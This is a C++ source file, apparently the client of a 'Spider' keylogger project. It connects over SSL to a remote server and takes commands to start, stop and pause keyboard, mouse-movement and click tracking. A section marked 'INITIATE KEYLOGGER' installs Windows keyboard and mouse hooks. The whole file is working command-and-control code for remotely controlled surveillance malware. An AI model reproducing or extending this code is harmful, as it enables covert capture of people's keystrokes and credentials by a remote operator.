#include "stdafx.h"
#include "BoostNetwork.h"
#include "Client.hpp"
#include "KbHooker.hpp"
#include "MouseHooker.hpp"

Client::Client(const std::string& port, const std::string& host,
	boost::asio::io_service& io_service, boost::asio::ssl::context &context) :
	_network(std::make_shared<BoostNetwork>(port, host, io_service, context)),
	_sendListQ({
		{ Spider::RequestCode::VALID_ASK_ID_RESPONSE, &Client::responseClientId },
		{ Spider::RequestCode::VALID_DISCONNECT, &Client::responseShutdown },
		{ Spider::RequestCode::VALID_GET_STATUS_RESPONSE, &Client::responseStatus }
}),
_requList({
	{ Spider::RequestCode::PING, (&Client::requestPing) },
	{ Spider::RequestCode::ASK_ID, (&Client::requestId) },
	{ Spider::RequestCode::KEYBOARD_TRACK_ACTIVATE, (&Client::requestKbActivate) },
	{ Spider::RequestCode::KEYBOARD_TRACK_DEACTIVATE, (&Client::requestKbDeactivate) },
	{ Spider::RequestCode::MOUSE_MVMT_TRACK_ACTIVATE, (&Client::requestTrackActivate) },
	{ Spider::RequestCode::MOUSE_MVMT_TRACK_DEACTIVATE, (&Client::requestTrackDeactivate) },
	{ Spider::RequestCode::MOUSE_CLICK_TRACK_ACTIVATE, (&Client::requestClickActivate) },
	{ Spider::RequestCode::MOUSE_CLICK_TRACK_DEACTIVATE, (&Client::requestClickDeactivate) },
	{ Spider::RequestCode::DISCONNECT, (&Client::requestDisconnect) },
	{ Spider::RequestCode::PAUSE_ACTIVATE, (&Client::requestPauseActivate) },
	{ Spider::RequestCode::PAUSE_DEACTIVATE, (&Client::requestPauseDeactivate) },
	{ Spider::RequestCode::SET_FREQUENCY, (&Client::requestFrequency) },
	{ Spider::RequestCode::GET_STATUS, (&Client::requestStatus) }
})
{
	gControlData = &_data;
}

int					Client::connectClient()
{
	Spider::RequestCode	toSend;
	r_fnct				func;

	try
	{
		_network->tryConnection();
		std::thread    sendThread(sendData, std::ref(*this));
		std::thread		inputThread(startHooking);
		while (true)
		{
			_code = _network->receive();
			try {
				func = _requList.at(static_cast<Spider::RequestCode>(_code));
			}
			catch (const std::exception &e) {
				std::cout << e.what() << std::endl;
				continue;
			}
			toSend = (this->*func)();
			_msgQ.push(toSend);
			_network->run();
		}
		sendThread.join();
		inputThread.join();
	}
	catch (const std::exception &e) {
		std::cerr << e.what() << std::endl;
		return (EXIT_FAILURE);
	}
	return (EXIT_SUCCESS);
}

// REQUEST FUNCTIONS

Spider::RequestCode		Client::requestPing() { return (Spider::VALID_PING_RESPONSE); }

Spider::RequestCode		Client::requestId() { return (Spider::VALID_ASK_ID_RESPONSE); }

Spider::RequestCode		Client::requestKbActivate()
{
	_data._state.activateKb();
	return (Spider::VALID_KEYBOARD_TRACK_ACTIVATE);
}

Spider::RequestCode		Client::requestKbDeactivate()
{
	_data._state.deactivateKb();
	return (Spider::VALID_KEYBOARD_TRACK_DEACTIVATE);
}

Spider::RequestCode		Client::requestTrackActivate()
{
	_data._state.activateTracking();
	return (Spider::VALID_MOUSE_MVMT_TRACK_ACTIVATE);
}

Spider::RequestCode		Client::requestTrackDeactivate()
{
	_data._state.deactivateTracking();
	return (Spider::VALID_MOUSE_MVMT_TRACK_DEACTIVATE);
}

Spider::RequestCode		Client::requestClickActivate()
{
	_data._state.activateClick();
	return (Spider::VALID_MOUSE_CLICK_TRACK_ACTIVATE);
}

Spider::RequestCode		Client::requestClickDeactivate()
{
	_data._state.deactivateClick();
	return (Spider::VALID_MOUSE_CLICK_TRACK_DEACTIVATE);
}

Spider::RequestCode		Client::requestDisconnect() { return (Spider::VALID_DISCONNECT); }

Spider::RequestCode		Client::requestPauseActivate()
{
	_data._state.activatePause();
	return (Spider::VALID_PAUSE_ACTIVATE);
}

Spider::RequestCode		Client::requestPauseDeactivate()
{
	_data._state.deactivatePause();
	return (Spider::VALID_PAUSE_DEACTIVATE);
}

Spider::RequestCode		Client::requestFrequency() { return (Spider::VALID_SET_FREQUENCY); }

Spider::RequestCode		Client::requestStatus() { return (Spider::VALID_GET_STATUS_RESPONSE); }

/* INITIATE KEYLOGGER */

void			Client::startHooking() {
	KbHooker	*kbh = new KbHooker();
	MouseHooker	*mh = new MouseHooker();
	MSG			msg;

	kbh->startHook();
	mh->startHook();
	while (GetMessage(&msg, NULL, 0, 0)) {}
	kbh->stopHook();
	mh->stopHook();
}